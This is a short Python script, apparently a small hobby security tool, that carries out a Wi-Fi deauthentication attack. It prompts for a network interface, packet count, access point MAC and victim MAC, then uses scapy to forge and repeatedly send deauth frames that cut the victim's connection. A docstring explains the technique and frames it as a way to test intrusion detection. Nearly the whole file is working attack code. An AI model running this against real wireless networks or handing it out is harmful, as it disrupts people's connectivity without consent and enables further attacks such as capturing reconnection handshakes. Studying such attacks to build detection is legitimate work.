#!/usr/bin/env python 

# Deauth_Attacker Python Tool Version 1.0
# Developed By Mostafa_Samy
# Github Link ==>> https://github.com/Mostafa-Samy-97

'''
Description About the Tool : 
---------------------------------
Deauthentication frames fall under the category of the management frame When
a client wishes to disconnect from AP, the client sends the deauthentication frame
AP also sends the deauthentication frame in the form of a reply. This is the normal
process, but an attacker takes advantage of this process. The attacker spoofs the
MAC address of the victim and sends the deauth frame to AP on behalf of the victim
because of this, the connection of the client is dropped ,
this python tool is a simple model of aireplay-ng program .
The aim of this attack is not only to perform a deauth attack but also to check the
victim's security system. IDS should have the capability to detect the deauth attack.
So far, there is no way of avoiding attack, but it can be detected
'''
from scapy.all import *
import sys

# get network interface from user
interface = raw_input("\nEnter your Interface > ")

# get Packets Count from user 
Packets_Count = int(raw_input('\nEnter Packets Count > '))

# get mac address of wifi access point
BSSID = raw_input("\nEnter the MAC Address of Access Point > ")

# get mac address of our target machine
victim_mac = raw_input("\nEnter the MAC Address of Victim Device > ")

# statement creates the deauth packet
frame= RadioTap()/ Dot11(addr1=victim_mac,addr2=BSSID, addr3=BSSID)/Dot11Deauth()

# count gives the total number of packets sent, and inter indicates the interval between the two packets
print('\n[+] Sending Deauthentication Packets to ' + victim_mac + ' Device\n')
sendp(frame,iface=interface, count= Packets_Count, inter= .1)